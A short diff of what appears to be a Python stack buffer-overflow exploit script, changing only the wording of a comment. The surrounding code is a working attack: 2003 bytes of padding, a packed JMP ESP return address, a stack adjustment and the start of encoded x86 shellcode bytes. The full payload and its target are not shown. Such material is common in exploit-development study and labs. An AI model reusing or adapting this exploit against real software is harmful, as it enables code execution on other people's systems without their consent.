@@ -14,7 +14,7 @@ buf += "A" * 2003
 
 buf += struct.pack("<I", ptr_jump_esp) # Formatting memory address for Little Endian (x86)
 
-buf += "\x83\xec\x10" # Move ESP to up a bit to prevent shigata_na_gai from breaking it
+buf += "\x83\xec\x10" # Move ESP up a bit in the stack to prevent shigata_na_gai from breaking it
 
 buf += "\xda\xd8\xd9\x74\x24\xf4\xba\x6d\x91\xc4\x06\x5f\x2b" # Begin shellcode
 buf += "\xc9\xb1\x31\x31\x57\x18\x83\xc7\x04\x03\x57\x79\x73"
